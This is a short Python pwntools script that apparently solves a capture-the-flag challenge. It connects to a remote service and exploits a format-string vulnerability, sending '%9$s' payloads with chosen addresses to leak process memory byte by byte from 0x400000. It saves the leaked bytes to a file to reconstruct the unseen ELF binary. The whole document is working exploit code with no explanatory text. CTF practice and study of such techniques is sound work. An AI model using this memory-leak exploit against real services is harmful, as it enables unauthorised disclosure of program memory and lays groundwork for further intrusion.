from pwn import *

context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 18735)

io.recvuntil(b"You don't have the ELF, but you have a magic echo...\n")

lead_end = b"\xde\xad\xbe\xef"

addr = 0x400000

while True:
    io.sendline(b"%9$s" + lead_end + p64(addr))

    recv_all = b""
    while lead_end not in recv_all:
        recv_chunk = io.recv(timeout=1)
        if not recv_chunk:
            continue
        recv_all += recv_chunk
    # recv_valid = recv_all[:recv_all.find(lead_end)]
    idx = recv_all.find(lead_end)
    recv_valid = recv_all[:idx]
    leftover = recv_all[idx+len(lead_end):]

    tail = p64(addr).split(b'\x00')[0]
    need = len(tail) - len(leftover)
    if need > 0:
        io.recvn(need, timeout=1)

    if recv_valid is None:
        break
    
    if len(recv_valid) == 0:
        recv_valid = b'\x00'

    with open('elf', 'ab') as f:
        f.write(recv_valid)
    addr += len(recv_valid)

io.close()